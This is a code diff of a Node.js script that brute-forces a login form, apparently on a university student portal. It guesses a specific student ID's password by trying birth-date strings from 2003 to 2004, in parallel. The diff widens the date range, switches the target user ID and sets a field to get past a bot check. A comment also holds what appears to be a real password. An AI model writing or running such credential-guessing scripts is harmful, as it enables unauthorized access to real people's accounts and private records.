@@ -8,36 +8,40 @@ async function main() {
     let month = 1;
     let date = 1;
     let pwd = "";
-    for (yr = 2003; yr >= 2003; yr--) {
-        for (month = 1; month <= 6; month++) {
+    for (yr = 2004; yr >= 2003; yr--) {
+        for (month = 1; month <= 12; month++) {
+            let arr=[];
             for (date = 1; date <= 31; date++) {
+                
                 let ystr = yr.toString();
                 let mstr = month.toString();
                 let dstr = date.toString();
                 if (mstr.length == 1) mstr = "0" + mstr;
                 if (dstr.length == 1) dstr = "0" + dstr;
                 pwd = ystr + "-" + mstr + "-" + dstr;
-                // console.log(pwd)
-                let outp = await execute(pwd)
-                if (outp != "") name = outp;
+                let outp = execute(pwd)
+                arr.push(outp);
             }
-        }
+            const narr=await Promise.all(arr);
+            narr.forEach(data=>{
+                if(data && data.length!=0){
+                    console.log(data[0].toString());
+                    process.exit(1);
+                }
+            })
+            console.log("Failed for "+month+" month")
     }
 
-    execute("Om@iiita1")
-    let outp = await execute(pwd)
-    if (outp != "") name = outp;
-    console.log(name)
+    
+}
 }
 async function execute(pwd) {
-    console.log(pwd)
 
     let data = new FormData();
     data.append('myBatch', 'Jan-2024');
-    data.append('uid', 'IIT2022000');
+    data.append('uid', 'IFI2022018');
     data.append('pwd', pwd);
     data.append('norobo', '1');
-    // import { parse } from 'node-html-parser';s
     const { parse } = require("node-html-parser");
 
     let config = {
@@ -62,33 +66,16 @@ async function execute(pwd) {
         },
         data: data
     };
-    let tr = "";
     try {
         const res = await axios.request(config);
         const root = parse(res.data);
-        if(pwd=="Om@iiita1") console.log(root)
-        // console.log(res.data)
+        return root.getElementsByTagName("sup")
+        // if(pwd=="Om@iiita1") console.log(root.toString())
     }
     catch(e){
-        // console.log(e);
-        console.log("Failed for "+pwd)
+        console.log("FAILED FOR "+pwd+e);
     }
-    // axios.request(config)
-    //     .then((response) => {
-    //         //   console.log(response);
-    //         const root = parse(response.data);
-    //         console.log(root.getElementsByTagName("sup")[0].toString())
-    //         found = 1;
-    //         name = root.getElementsByTagName("sup")[0].toString()
-    //         tr = name
-    //         return tr;
-    //     })
-    //     .catch((error) => {
-    //         console.log("Done with " + pwd);
-    //         if (pwd == "Om@iiita1") console.log(error)
-    //     });
-    return tr;
-
+    return null;
 }
 
 main()
